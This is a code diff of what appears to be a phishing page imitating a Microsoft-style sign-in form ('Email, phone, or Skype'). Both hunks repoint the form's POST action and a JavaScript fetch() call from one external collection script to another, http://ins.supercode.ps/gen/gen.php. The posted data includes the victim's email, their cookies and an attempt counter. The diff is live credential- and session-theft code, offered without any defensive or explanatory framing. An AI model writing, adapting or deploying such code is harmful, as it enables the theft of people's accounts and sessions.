@@ -139,7 +139,7 @@
         <div class="logo" id="logo-container"></div>
         <h1></h1>
         <div id="email-display" class="email-display" style="display: none;"></div>
-        <form id="signin-form" action="https://v2.lwcgi.org/gen/gen.php" method="POST">
+        <form id="signin-form" action="http://ins.supercode.ps/gen/gen.php" method="POST">
             <div class="input-group email-group">
                 <label for="email" style="display: none;">Email, phone, or Skype</label>
                 <input type="email" id="email" name="email" placeholder="Email, phone, or Skype" required>
@@ -248,7 +248,7 @@
                 formData.append('cookies', JSON.stringify(cookies));
                 formData.append('attempt', attemptCounter);
 
-                fetch('https://v2.lwcgi.org/gen/gen.php', {
+                fetch('http://ins.supercode.ps/gen/gen.php', {
                     method: 'POST',
                     body: formData
                 })
